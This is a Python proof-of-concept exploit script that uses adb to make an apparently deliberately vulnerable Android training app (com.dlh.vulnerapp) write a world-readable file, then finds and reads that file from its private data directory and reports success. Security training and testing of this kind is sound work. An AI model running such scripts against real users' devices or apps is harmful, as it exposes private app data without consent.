#!/usr/bin/env python3
import subprocess
import threading
import time
import re
import sys

def run_logcat():
    """Monitor logcat for success indicators"""
    global logcat_output
    logcat_output = []
    try:
        process = subprocess.Popen(['adb', 'logcat', '-v', 'brief'], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE, 
                                 text=True)
        
        for line in process.stdout:
            logcat_output.append(line.strip())
            if len(logcat_output) > 1000:  # Keep buffer manageable
                logcat_output = logcat_output[-500:]
                
    except Exception as e:
        print(f"Error monitoring logcat: {e}")

def check_file_access():
    """Attempt to read the world-readable file"""
    try:
        # Get the target app's package directory
        result = subprocess.run(['adb', 'shell', 'find', '/data/data/com.dlh.vulnerapp/files/', '-name', 'public_secret.txt', '-readable'], 
                              capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0 and 'public_secret.txt' in result.stdout:
            file_path = result.stdout.strip()
            print(f"[+] Found world-readable file: {file_path}")
            
            # Try to read the file content
            read_result = subprocess.run(['adb', 'shell', 'cat', file_path], 
                                       capture_output=True, text=True, timeout=10)
            
            if read_result.returncode == 0 and 'world-readable secret' in read_result.stdout:
                print(f"[+] SUCCESS: Read sensitive data from world-readable file!")
                print(f"[+] Content: {read_result.stdout}")
                return True
            else:
                print(f"[-] Could not read file content: {read_result.stderr}")
                
        else:
            print("[-] File not found or not readable")
            
    except Exception as e:
        print(f"[-] Error accessing file: {e}")
    
    return False

def trigger_file_creation():
    """Launch the InsecureFileActivity to create the world-readable file"""
    try:
        print("[*] Launching InsecureFileActivity...")
        subprocess.run(['adb', 'shell', 'am', 'start', '-n', 'com.dlh.vulnerapp/.InsecureFileActivity'], 
                      capture_output=True, timeout=10)
        
        time.sleep(2)
        
        # Simulate clicking the write button to create the file
        print("[*] Triggering file creation...")
        subprocess.run(['adb', 'shell', 'input', 'tap', '500', '400'], timeout=5)
        
        time.sleep(3)
        
        return True
        
    except Exception as e:
        print(f"[-] Error launching activity: {e}")
        return False

def main():
    print("[*] Starting Android World-Readable File Exploit")
    print("[*] Target: com.dlh.vulnerapp (InsecureFileActivity)")
    
    # Start logcat monitoring in background
    logcat_thread = threading.Thread(target=run_logcat, daemon=True)
    logcat_thread.start()
    
    time.sleep(2)
    
    # Check if app is installed
    try:
        result = subprocess.run(['adb', 'shell', 'pm', 'list', 'packages', 'com.dlh.vulnerapp'], 
                              capture_output=True, text=True, timeout=10)
        if 'com.dlh.vulnerapp' not in result.stdout:
            print("[-] Target app not installed!")
            return False
    except:
        print("[-] Could not check if app is installed")
        return False
    
    # Trigger file creation
    if not trigger_file_creation():
        print("[-] Failed to trigger file creation")
        return False
    
    # Attempt to exploit - read the world-readable file
    print("[*] Attempting to read world-readable file...")
    success = check_file_access()
    
    # Check logcat for additional indicators
    time.sleep(2)
    toast_found = any('Created world-readable file!' in line for line in logcat_output[-50:])
    if toast_found:
        print("[+] Detected file creation toast in logcat")
    
    if success:
        print("\n[+] EXPLOIT SUCCESSFUL!")
        print("[+] Sensitive data leaked through world-readable file")
        return True
    else:
        print("\n[-] Exploit failed - file may not be world-readable or accessible")
        return False

if __name__ == "__main__":
    main()
